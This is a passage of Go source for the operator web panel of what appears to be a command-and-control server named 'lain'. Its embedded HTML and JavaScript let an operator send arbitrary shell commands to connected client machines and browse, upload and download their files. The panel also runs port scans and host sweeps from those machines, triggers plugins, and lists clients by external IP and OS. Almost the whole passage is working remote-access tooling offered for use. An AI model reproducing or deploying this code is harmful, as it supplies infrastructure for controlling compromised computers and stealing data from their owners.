                <meta http-equiv="X-UA-Compatible" content="IE=edge">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <link rel="stylesheet" href="/lain.css">
            </head>
            <body>
                <div class="filecontainer">
                    <div>
                        <label for="splitSize">Enter the split size (each part in MB): </label>
                        <input type="number" id="splitSize" min="1" placeholder="Enter part" />
                    </div>
                    <div id="file" class="file-manager"></div>
                    <form id="uploadForm">
                        <input type="file" id="uploadFile" name="uploadFile" required>
                        <input class="fileinput" type="submit" class="dir-btn" value="Upload">
                    </form>
                    <div class="dir-btn" onclick="get_dir(1)">&#x21B6; ../</div>
                    <div class="dir-controls">
                        <p id="cur_dir_p"></p>
                        <input type="text" id="directoryInput">
                        <button id="moveDirButton" onclick="move_dir()">Goto folder</button>
                    </div>
                </div>
                <script src="/lain.js"></script>
                <script>
                    const shell_file = new lain_shell();
                    document.getElementById('uploadForm').addEventListener('submit', function(event) {
                        event.preventDefault(); // 阻止表单默认提交行为
                        var fileInput = document.getElementById('uploadFile');
                        var file = fileInput.files[0];
                        var splitSizeInput = document.getElementById('splitSize');
                        var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                        if (file) {
                            let file_name = shell_file.shell_dir + "/" + file.name;
                            var fileSize = file.size;
                            var formData = new FormData();
                            formData.append('uploadFile', file);
                            formData.append('uid', shell_file.uid);
                            formData.append('filename',file_name);
                            formData.append('splitSize',splitSize);
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', '/user_index?op=uploadFile', true);
                            xhr.onload = function() {
                                if (xhr.status === 200) {
                                    console.log('File uploaded successfully');
                                    shell_file.loadFile(file_name,fileSize);
                                } else {
                                    alert('The file is being used');
                                }
                            };
                            xhr.send(formData);
                        } else {
                            alert("Please select a file");
                        }
                    });
                    shell_file.look_file("./");
                    function get_dir(get_switch) {
                        let cur_dir = "no";
                        shell_file.move_file(get_switch, cur_dir);
                    }
                    function move_dir(){
                        shell_file.move_dir();
                    }
                    document.addEventListener('DOMContentLoaded', function() {
                        let username = shell_file.username;
                        if (username) {
                            // document.getElementById("username").textContent = username;
                        } else {
                            window.location.href = "about:blank";
                        }
                    });
                </script>
            </body>
            </html>
            `
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

//cmd-html
func cmd_html() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            fmt.Fprint(w, error_str)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            fmt.Fprint(w,error_str)
            return
        }
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="/lain.css">
</head>
<body>
	<div class="shell-container">
		<label for='options' style='margin-right: 10px;'>Select Shell:</label>
		<select id='options' name='options' style='margin-left: 10px;'></select>
	</div>
	<div class="terminal" id="terminal">
		<div class="input-container">
			<div class="prompt">Command></div>
			<input type="text" class="shell-input" id="input" autofocus>
		</div>
	</div>

	<script src="/lain.js"></script>
	<script>
		const shell = new lain_shell();
		const inputElement = document.getElementById('input');
		const terminal = document.getElementById('terminal');
		const inputContainer = terminal.querySelector('.input-container');
		let currentInput = inputElement;
		inputElement.addEventListener('keydown', async function (event) {
			if (event.key === 'Enter') {
				event.preventDefault();
				const command = currentInput.value.trim();
				if (command) {
					shell.get(command);
				}
			}
		});
		document.addEventListener('DOMContentLoaded', function() {
		let urlParams = new URLSearchParams(window.location.search);
		let uid = urlParams.get('uid');
		if (!shell.username) {
			window.location.href = "about:blank";
		}
		fetch('/user_index?op=getOs&uid=' + uid)
		.then(response => response.text())
		.then(data => {
			const optionsElement = document.getElementById('options');
			if (data === 'win') {
				optionsElement.innerHTML = "<option>Shell</option><option value='cmd'>cmd</option><option value='powershell'>powershell</option><option value='custom'>customize shell</option>";
			} else if (data === 'linux' || data === 'macos') {
				optionsElement.innerHTML = "<option>Shell</option><option value='bash'>bash</option><option value='sh'>sh</option><option value='custom'>customize shell</option>";
			} else if (data === 'android') {
				optionsElement.innerHTML = "<option>Shell</option><option value='/system/bin/bash'>/system/bin/bash</option><option value='/system/bin/sh'>/system/bin/sh</option><option value='custom'>customize shell</option>";
			}
		});
	});

	document.getElementById('options').addEventListener('change', function() {
		let selectedValue = this.value;

		if (selectedValue === 'custom') {
			// 用户选择了“自定义...”
			let customEnv = prompt("enter a shell:");

			if (customEnv) {
				// 创建一个新的 <option> 元素
				const newOption = document.createElement("option");
				newOption.value = customEnv;
				newOption.textContent = customEnv;

				// 将新的选项插入到下拉框中
				this.insertBefore(newOption, this.querySelector("option[value='custom']"));

				// 设置新的选项为选中状态
				this.value = customEnv;

				// 通知 shell 切换到自定义环境
				shell.switchVer(customEnv);
			} else {
				// 如果用户取消输入或未输入内容，重置为默认选项
				this.value = "Shell";
			}
		} else {
			// 通知 shell 切换到选定的环境
			shell.switchVer(selectedValue);
		}
	});
	</script>
</body>
</html>
`
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

//plugin-html
func pluginHtml() http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        //必须先登录
        usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            fmt.Fprint(w, error_str)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            fmt.Fprint(w,error_str)
            return
        }
        if r.Method == http.MethodGet {
            html := `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="/lain.css">
</head>
<body>
    <script>
    window.addEventListener('DOMContentLoaded', () => {
        let urlParams = new URLSearchParams(window.location.search);
        let uid = urlParams.get('uid');
        let os = urlParams.get('os');
        let paramDescList = urlParams.get('paramDescList');
        let codeword = urlParams.get('codeword');
        let paramDescArray = paramDescList ? decodeURIComponent(paramDescList).split(',') : [];

        if (!uid || !os || !paramDescList || !codeword) {
            alert("Missing required parameters in the URL.");
            return;
        }

        let dialog = document.createElement('form'); 
        dialog.style.border = "1px solid #ccc";
        dialog.style.padding = "16px";
        dialog.style.width = "95%";
        dialog.style.margin = "40px auto";
        dialog.style.backgroundColor = "#f9f9f9";
        dialog.style.borderRadius = "8px";
        dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";

        paramDescArray.forEach(desc => {
            let input = document.createElement('input');
            input.type = 'text';
            input.placeholder = desc;
            input.style.display = "block";
            input.style.margin = "8px 0";
            input.style.width = "90%";
            input.style.padding = "8px";
            input.style.boxSizing = "border-box";
            dialog.appendChild(input);
        });

        let submitButton = document.createElement('button');
        submitButton.textContent = 'send';
        submitButton.style.padding = "10px 20px";
        submitButton.style.marginTop = "12px";
        submitButton.style.cursor = "pointer";

        submitButton.onclick = function(event) {
            event.preventDefault();  // 阻止默认提交行为，防止页面刷新
            sendMsg();
        };

        dialog.appendChild(submitButton);

        document.body.appendChild(dialog);

        function sendMsg() {
            let inputs = dialog.querySelectorAll('input[type="text"]');
            let msgParts = [];
            for (let input of inputs) {
                let value = input.value.trim();
                if (!value) {
                    alert("Please fill in all fields.");
                    return;
                }
                msgParts.push(value);
            }

            let msg = codeword + '^' + msgParts.join('^');

            fetch('/user_index?op=msg&uid=' + encodeURIComponent(uid) + '&msg=' + encodeURIComponent(msg), {
                method: 'GET'
            })
            .then(response => {
                if (response.ok) {
                    alert("Message sent successfully!");
                    inputs.forEach(input => input.value = '');
                } else {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
            })
            .catch(error => {
                console.error("Failed to send message:", error);
                alert("Failed to send message: " + error.message);
            });
        }
    });
</script>
</body>
</html>
`
            w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

func msgHtml() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            fmt.Fprint(w, error_str)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            fmt.Fprint(w,error_str)
            return
        }
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
        body {
            font-family: sans-serif;
            padding: 20px;
            background-color: #f7f7f7;
        }
        .msg-item {
            background: white;
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 8px;
            position: relative;
        }
        .btn-group {
            position: absolute;
            right: 10px;
            top: 10px;
        }
        .move-btn, .del-btn {
            margin-left: 5px;
            padding: 4px 6px;
            font-size: 14px;
        }
        .msg-item span {
            user-select: none;
        }
        .msg-item span[title] {
            color: blue;
            text-decoration: underline dotted;
        }
    </style>
</head>
<body>
    <h2>Msg list</h2>
    <div id="msg-container">loading...</div>
    <script>
        const msgContainer = document.getElementById('msg-container');
        const uid = new URLSearchParams(window.location.search).get('uid');
        const server = window.location.protocol + "//" + window.location.host;

        function loadMessages() {
            msgContainer.innerHTML = ''; // 清空整个容器

            // 加载 getMsgList 消息
            fetch(server + "/user_index?op=getMsgList&uid=" + uid)
                .then(res => res.json())
                .then(data1 => {
                    if (data1.messages && data1.messages.length > 0) {
                        data1.messages.forEach((msg, index) => {
                            const msgElement = createMsgWithButtons(msg, index);
                            msgContainer.appendChild(msgElement);
                        });
                    }
                    // 加载 getMsgPost 消息（result list）
                    return fetch(server + "/user_index?op=getMsgPost&uid=" + uid);
                })
                .then(response => response.json())
                .then(data => {
                    if (data.messages && data.messages.length > 0) {
                        const postTitle = document.createElement('h2');
                        postTitle.textContent = 'result List';
                        msgContainer.appendChild(postTitle);
                        data.messages.forEach((msg, index) => {
                            const msgDiv = document.createElement('div');
                            msgDiv.className = 'msg-item';
                            msgDiv.style.display = 'flex';
                            msgDiv.style.justifyContent = 'space-between';
                            msgDiv.style.alignItems = 'center';
                            msgDiv.style.gap = '8px';
                            const shortText = msg.length > 10 ? msg.slice(0, 10) + '…' : msg;
                            let expanded = false;
                            const span = document.createElement('span');
                            span.textContent = shortText;
                            span.style.cursor = 'pointer';
                            span.onclick = () => {
                                expanded = !expanded;
                                span.textContent = expanded ? msg : shortText;
                            };
                            // ✅ 按钮容器
                            const btnGroup = document.createElement('div');
                            btnGroup.style.display = 'flex';
                            btnGroup.style.gap = '4px'; // 两个按钮之间的间距小一点

                            // 复制按钮
                            const copyBtn = document.createElement('button');
                            copyBtn.textContent = '📋';
                            copyBtn.className = 'copy-btn';
                            copyBtn.title = '复制';
                            copyBtn.onclick = () => {
                                navigator.clipboard.writeText(msg).then(() => {
                                    copyBtn.textContent = '✅';
                                    setTimeout(() => copyBtn.textContent = '📋', 1000);
                                }).catch(console.error);
                            };

                            // 删除按钮
                            const delBtn = document.createElement('button');
                            delBtn.textContent = '🗑';
                            delBtn.className = 'del-btn';
                            delBtn.title = '删除';
                            delBtn.onclick = () => {
                                const idx = Array.from(msgDiv.parentElement.children).indexOf(msgDiv) - 1;
                                const url = server + "/user_index?op=delMsgMap"
                                    + "&uid=" + encodeURIComponent(uid)
                                    + "&index=" + idx;
                                fetch(url, { method: 'GET' })
                                    .then(() => msgDiv.remove())
                                    .catch(console.error);
                            };

                            // ✅ 将两个按钮放入按钮容器
                            btnGroup.appendChild(copyBtn);
                            btnGroup.appendChild(delBtn);

                            // ✅ 将 span 和按钮容器加入主容器
                            msgDiv.appendChild(span);
                            msgDiv.appendChild(btnGroup);
                            msgContainer.appendChild(msgDiv);
                        });
                    }
                })
                .catch(error => {
                    console.error("消息获取失败：", error);
                });
        }

        // 初次加载
        loadMessages();

        // 每 5 秒自动刷新一次
        setInterval(loadMessages, 5000);

        // 其他函数不变
        function createMsgWithButtons(rawMsg, index) {
            const parts = rawMsg.split('^');
            let msgText = rawMsg; // 默认展示原始消息
            if (parts[0] === 'getUfriends') {
                msgText = 'scan:    ' + parts[1]+ '     range:    '+parts[2]+ '     delay:     '+parts[3];
            }else if (parts[0] === 'getTime') {
                msgText = 'change delay:     ' + parts[1] + '     seconds';
            }else if (parts[0] === 'getUfile') {
                msgText = 'File:     ' + parts[1] + ' Size:    ' + parts[2] + '    bytes';
            }else if (parts[0] === 'loadUfile') {
                msgText = 'File: ' + parts[1];
            }else if (parts[0] === 'lookUpFile') {
                msgText = 'lookDir:     ' + parts[1];
            }else if (parts[0] === 'getHisports'){
                msgText = 'sniff:     ' + parts[1]+ '     range:     '+parts[2]+ '     delay:     '+parts[3];
            }else if (parts[0] === 'SwUVer'){
                msgText = 'change shell:     ' + parts[1];
            }
            const msgDiv = document.createElement('div');
            msgDiv.className = 'msg-item';
            msgDiv.dataset.index = index;

            const idxStr = String(index).padStart(2, '0');
            const indexLabel = document.createElement('span');
            indexLabel.textContent = "[" + idxStr.slice(0, 10) + "] ";
            msgDiv.appendChild(indexLabel);
            msgDiv.appendChild(document.createTextNode(msgText));

            const btnGroup = document.createElement('div');
            btnGroup.className = 'btn-group';

            const upBtn = document.createElement('button');
            upBtn.textContent = '⬆';
            upBtn.className = 'move-btn';
            upBtn.onclick = () => {
                const prev = msgDiv.previousElementSibling;
                if (prev) {
                    msgContainer.insertBefore(msgDiv, prev);
                    sendReorder(msgDiv, prev);
                }
            };

            const downBtn = document.createElement('button');
            downBtn.textContent = '⬇';
            downBtn.className = 'move-btn';
            downBtn.onclick = () => {
                const next = msgDiv.nextElementSibling;
                if (next) {
                    msgContainer.insertBefore(next, msgDiv);
                    sendReorder(msgDiv, next);
                }
            };

            const delBtn = document.createElement('button');
            delBtn.textContent = '🗑';
            delBtn.className = 'del-btn';
            delBtn.onclick = () => {
                const idx = Array.from(msgContainer.children).indexOf(msgDiv);
                if (idx >= 0) {
                    const url = server + "/user_index?op=delMsgGet"
                        + "&uid=" + encodeURIComponent(uid)
                        + "&index=" + idx;
                    fetch(url, { method: 'GET' })
                        .then(() => msgDiv.remove())
                        .catch(console.error);
                }
            };

            btnGroup.appendChild(upBtn);
            btnGroup.appendChild(downBtn);
            btnGroup.appendChild(delBtn);
            msgDiv.appendChild(btnGroup);

            return msgDiv;
        }

        function sendReorder(sourceDiv, targetDiv) {
            const s_id = Array.from(msgContainer.children).indexOf(sourceDiv);
            const pos = Array.from(msgContainer.children).indexOf(targetDiv);
            if (s_id === -1 || pos === -1) return;
            const url = server + "/user_index?op=changeMsh"
                + "&uid=" + encodeURIComponent(uid)
                + "&s_id=" + s_id
                + "&pos=" + pos;
            fetch(url).catch(console.error);
        }
    </script>
</body>
</html>
`
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

func lain_js() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            fmt.Fprint(w,error_str)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            fmt.Fprint(w,error_str)
            return
        }
		if r.Method == http.MethodGet {
html := `
class index{
    constructor() {
      this.server = window.location.protocol + "//" + window.location.host;
      this.username = this.getCookie("cookie");
    }
    getCookie(name) {
        let cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i];
            let cookieParts = cookie.split('=');
            if (cookieParts[0] === name) {
                return cookieParts[2];
            }
        }
        return null;
    }
      lainShell(){
        if (this.username){
            let interval_server=this.server+"/user_index?op=listen&username="+this.username;
            setInterval(function(){
                fetch(interval_server)
                .then(response=>{
                    return response.text();
                })
                .then(data=>{
                let div = document.getElementById('div_conn');
                    div.innerHTML=data;
                })
                },3500)
            }
      }
      get(uid,shellname){
        let confirm1 = confirm('confirm?');
        if(confirm1){
            let key_url= this.server+"/user_index?op=insertKey&uid="+uid+"&username="+this.username+"&request="+shellname;
            fetch(key_url,{
                credentials: 'include' // 发送 cookie
            })
                return uid
            }
        }
        del(uid){
            let right = confirm('confirm?');
            let ms = confirm('ok');
            if (right && ms){
                document.getElementById("container-"+uid)?.remove();
                fetch(this.server+"/user_index?op=delIndex&uid="+uid)
                .then(response=>response.text())
                .then(data=>{
                })
            }
        }
      }
      
      class lain_shell{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            const urlParams = new URLSearchParams(window.location.search);
            this.uid=urlParams.get('uid');
            this.username=this.getCookie("cookie");
            // this.results=document.getElementById('results').innerHTML;
            // document.getElementById('shellname').innerText=this.shellname;
            this.shell_dir = '';
            this.isMovingFile = false;
            this.move_file = this.move_file.bind(this);
            this.look_file = this.look_file.bind(this);
            this.intervalId = null;
            this.currentInput="";
            this.inputContainer="";
            this.inputKeydown = this.inputKeydown.bind(this);
            this.init();
        }

        init(){
            fetch(this.server+"/user_index?op=getCurrentDir&uid="+this.uid)
            .then(response => response.text())
            .then(data => {
                this.shell_dir = data;
                console.log(this.shell_dir);
            })
        }

        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }      
        async lain_time() {
            if (this.uid) {
                let interval_server =this.server+"/user_index?op=getResults&uid="+this.uid;
                let self = this;
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                }
                return new Promise((resolve, reject) => {
                    this.intervalId = setInterval(async function () {
                        try {
                            let response = await fetch(interval_server, {
                                method: 'GET',
                                headers: {
                                    'Referer': 'http://localhost/html/lain.js',
                                }
                            });
                            let data = await response.text();
                            if (data) {
                                const output = document.createElement('div');
                                output.contentEditable = true;
                                output.textContent = data;
                                output.className = 'output';
                                const inputContainer = terminal.querySelector('.input-container');
                                inputContainer.appendChild(output);
                                terminal.scrollTop = terminal.scrollHeight;
                                clearInterval(self.intervalId);
                                self.intervalId = null;
                                resolve(true);
                            }
                        } catch (error) {
                            console.error('Error:', error);
                            reject(false);
                        }
                    }, 1000);
                });
            } else {
                console.log('uid为空');
                return false;
            }
        }
        async get(command){
            if(command === "--help" && this.uid){
                const output = document.createElement('div');
                output.className = 'output';
                output.contentEditable = true;
                output.textContent = '--help: View help information\n' +
                    'scan: scan port(1-65535,scan [IP] [range(1,20,45...)or(1-65534)] [delay])\n' +
                    'sniff: scan host(sniff [net.range(1,20,45...)or(1-253)] [range(1,20,45...)or(1-65534)] [delay])\n';
                const inputContainer = terminal.querySelector('.input-container');
                inputContainer.appendChild(output);
                this.createInput();
            } else if (command.startsWith("scan") && this.uid) {
                this.sendjob('scan...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let port_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "getHisports^"+target+"^"+port_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell);
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            } else if (command.startsWith("sniff") && this.uid) {
                this.sendjob('sniff...'); // 创建新的提示符
                (async () => {
                    let target = command.split(" ")[1];
                    let sniff_list = command.split(" ")[2];
                    let sleep_time = command.split(" ")[3];
                    let powershell = "getUfriends^"+target+"^"+sniff_list+"^"+sleep_time+"^whatever";
                    let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell);
                    try {
                        await fetch(url,{
                            credentials: 'include' // 发送 cookie
                        });
                        this.createInput();
                    } catch (error) {
                        console.error("Error fetching command:", error);
                    }
                })();
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }else if(this.uid){
                this.sendjob('agent'); // 创建新的提示符
                let url = this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(command);
                await fetch(url,{
                    credentials: 'include' // 发送 cookie
                });
                let flag = await this.lain_time();
                if (flag) {
                    this.createInput();
                }
            }
        }
        input(){
            const inputElement = document.getElementById("input");
            currentInput = inputElement;
            inputElement.addEventListener("keydown", (event) => { // 使用箭头函数
                if (event.key === "Enter") {
                    event.preventDefault();
                    const command = currentInput.value.trim();
                    if (command) {
                        this.get(command); // this 现在指向正确的上下文
                    }
                }
            })
        }
        async sendjob(str){
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = str+' SendMsg--->>';
            const terminal = document.getElementById("terminal");
            const inputContainer = terminal.querySelector(".input-container");
            inputContainer.appendChild(newPrompt);
        }
        createInput() {
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = 'Command>';
            const newInput = document.createElement('input');
            newInput.type = 'text';
            newInput.className = 'shell-input';
            newInput.addEventListener('keydown', this.inputKeydown);
            currentInput.value = '';
            inputContainer.appendChild(newPrompt);
            inputContainer.appendChild(newInput);
            newInput.focus();
            currentInput = newInput;
        }
        async inputKeydown(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const command = currentInput.value.trim();
                if (command) {
                    await this.get(command);
                    let flag = await this.lain_time();
                    if (flag) {
                        createInput();
                    }
                }
            }
        }
        async loadFile(file_name,fileSize){
            if(fileSize && file_name){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                let file_key =  this.uid + "*" + file_name + "*" + splitSize
                var powershell = "loadUfile^"+file_key;
                fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(powershell))
                .then(response => response.text())
                .then()
                return true;
            }
        }
        async getFile(path){
            if(path){
                var splitSizeInput = document.getElementById('splitSize');
                var splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                var powershell = "getUfile^" + path + "^" + splitSize;
                fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell))
                .then(response => response.text())
                .then();
            }
        }        
        async look_file(dir) {
            if (this.uid && dir) {
                let powershell = "lookUpFile^" + dir;
                try {
                    await fetch(this.server + "/user_index?op=msg&uid=" + this.uid + "&msg=" + encodeURIComponent(powershell));
                    while (true) {
                        await new Promise(resolve => setTimeout(resolve, 5000));  // 每5秒轮询一次文件列表
                        let fileResponse = await fetch(this.server + "/user_index?op=getFileList&uid=" + this.uid);
                        let data = await fileResponse.text();
                        if (data) {
                            let div_file = document.getElementById('file');
                            div_file.innerHTML = '';  // 清空文件区域
                            let dir_list = data.split("\n");  // 将返回的数据按行分割为文件列表
        
                            for (let i = 0; i < dir_list.length; i++) {
                                let file = dir_list[i].trim();  // 去除文件名前后空格
                                if (file !== "") {
                                    // 保留完整信息，去除 dir 和 fil 前缀，保留文件名
                                    let cleanName = file.replace(/^(fil|dir)\s*/, "").trim();
                                    // 去除类似 <Size: 4.73 MB> 等标签，保留文件名
                                    let file_name = cleanName.match(/^(.*?)\s*(<.*?>)?$/)?.[1]?.trim() || cleanName;
        
                                    let new_file = document.createElement('div');
                                    new_file.classList.add('directory');
        
                                    // 处理目录（dir）文件
                                    if (file.startsWith("dir")) {
                                        new_file.innerHTML = '<span class="icon-dir">📁</span>' + cleanName;
                                        new_file.addEventListener('click', () => {
                                            this.move_file(0, file_name);  // 只传递文件名
                                        });
                                        new_file.classList.add('dir');
                                    } 
                                    // 处理文件（fil）文件
                                    else if (file.startsWith("fil")) {
                                        new_file.innerHTML = '<span class="icon-file">📄</span>' + cleanName + '<span class="icon-download" style="cursor: pointer;">⬇️</span>';
                                        new_file.classList.add('file');
        
                                        // 点击文件事件，获取文件
                                        new_file.addEventListener('click', () => {
                                            this.getFile(this.shell_dir + "/" + file_name);  // 传递正确的文件路径
                                        });
        
                                        // 下载图标点击事件
                                        const downloadIcon = new_file.querySelector('.icon-download');
                                        downloadIcon.addEventListener('click', (event) => {
                                            event.stopPropagation();  // 阻止点击事件冒泡
                                            this.getFile(this.shell_dir + "/" + file_name);  // 下载文件
                                        });
                                    }
        
                                    // 只有当文件名不为空时，才将其添加到页面
                                    if (new_file.innerText !== "") {
                                        div_file.appendChild(new_file);
                                    }
                                }
                            }
                            return true;
                        } else if (data == "is empty") {
                            return false;  // 如果目录为空，则返回 false
                        }
                    }
                } catch (error) {
                    console.error('Viewing directory failed:', error);  // 错误处理
                }
            }
        }
        async move_file(num, cur_dir) {
            let cur_dir_p = document.getElementById("cur_dir_p");
            if (this.isMovingFile) {
                console.log("Don't move around....");
                return;
            }
            this.isMovingFile = true; // 锁定操作
            let temp_dir = this.shell_dir; // 保存当前路径
            try {
                if (this.uid) {
                    if (num === 1 && cur_dir === 'no') {
                        this.shell_dir += '/..'; // 返回上级目录
                    } else if (num === 0) {
                        // 解析目录路径
                        this.shell_dir += "/" + cur_dir;
                    }
                    // 确保 look_file 异步执行
                    let flag = await this.look_file(this.shell_dir);
                    if (!flag) {
                        this.shell_dir = temp_dir; // 回退路径
                        alert("!Does not exist or has no permission to access this directory?");
                    }
                    console.log(this.shell_dir);
                }
            } catch (error) {
                console.error("An error occurred in move_file:", error);
            } finally {
                // 保证最终解锁
                cur_dir_p.textContent = "Path:\t" + this.shell_dir;
                this.isMovingFile = false;
            }
        }
        async move_dir(){
            let cur_dir_p = document.getElementById("cur_dir_p");
            let temp_dir = this.shell_dir;
            let directory = document.getElementById("directoryInput").value;
            this.shell_dir = directory;
            let flag = await this.look_file(this.shell_dir);
            if (!flag) {
                this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
                console.log("!Does not exist or has no permission to access this directory?")
            }
            console.log(this.shell_dir);
            cur_dir_p.textContent="Path:\t"+this.shell_dir;
        }

        get_btn_move(){
            var btn = document.getElementById('dir-btn');
            btn.addEventListener('click', async () => {
                this.move_file(1,'no')
            })
        }

        switchVer(value){
            let cmd = "SwUVer^"+value;
            fetch(this.server+"/user_index?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd))
        }
    }
    
    //主页面类
    class lain_index{
        constructor() {
            this.server = window.location.protocol + "//" + window.location.host;
            this.username = this.getCookie("cookie");
            this.User_data = [];
            this.check_time = [];
            this.check_uid = [];
        }
        
        getCookie(name) {
            let cookies = document.cookie.split('; ');
            for (let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i];
                let cookieParts = cookie.split('=');
                if (cookieParts[0] === name) {
                    return cookieParts[2];
                }
            }
            return null;
        }
        lain_shell() {
            if (this.username) {
                let container = document.getElementById('div_index');
                setInterval(() => {
                    let interval_server = this.server + "/user_index?op=userIndex&username=" + this.username + "&clientsCount=" + Object.keys(this.User_data).length;
                    fetch(interval_server)
                        .then(response => {
                            if (!response.ok && response.status === 400) {
                                return response.text(); 
                            }
                            if (response.ok) {
                                if (response.headers.get('Content-Type').includes('application/json')) {
                                    return response.json();
                                } else {
                                    return {};
                                }
                            } else {
                                return {};
                            }
                        })
                        .then(data => {
                            if (data === 'noNeeded') {
                                return;
                            } else if (Array.isArray(data) && data.length > 0) {
                                this.User_data = data;
                                net_init(this.User_data);
                                this.User_data.forEach(key => {
                                    let userDiv = document.getElementById(key['uid'] + "info");
                                    if (!userDiv) {
                                        userDiv = document.createElement('div');
                                        userDiv.classList.add('ip-info');
                                        userDiv.id = key['uid'] + "info";
                                        container.appendChild(userDiv);
                                    }

                                    let pluginButtons = ''; // 收集所有按钮 HTML
                                    let pluginParam = key['plugin_parameter'];
                                    let os = key['os'].toLowerCase(); // 加入 os 判断

                                    if (pluginParam && typeof pluginParam === 'object' && pluginParam[os]) {
                                        for (let codeword in pluginParam[os]) {
                                            let paramDescList = pluginParam[os][codeword];
                                            console.log('客户端', key['uid'], os + '插件：', codeword, paramDescList);
                                            let encodedDesc = encodeURIComponent((Array.isArray(paramDescList) ? paramDescList : []).join(','));
                                            let plugindiv = '<button class="console-link" onclick="openIframe(\'/pluginHtml?uid='
                                                + key['uid'] + '&os=' + os
                                                + '&paramDescList=' + encodedDesc
                                                + '&codeword=' + codeword + '\')">[' + codeword + ']</button>';
                                            pluginButtons += plugindiv;
                                        }
                                    }

                                    let osEmoji = "💻";
                                    if (os.includes("linux")) {
                                        osEmoji = "🐧";
                                    } else if (os.includes("macos")) {
                                        osEmoji = "🍏";
                                    } else if (os.includes("android")) {
                                        osEmoji = "🤖";
                                    }

                                    let userHTML = '<div class="conn-container">' +
                                        '<span class="shell-address">' + key['external_ip'] + '/</span>' +
                                        '<span class="ip-address">' + key['host'] + '/</span>' +
                                        '<span class="ip-address">' + key['uid'] + '/</span>' +
                                        '<div class="os-container">' +
                                            '<span class="ip-address">'+ key['server'] + '/'+'</span>' +
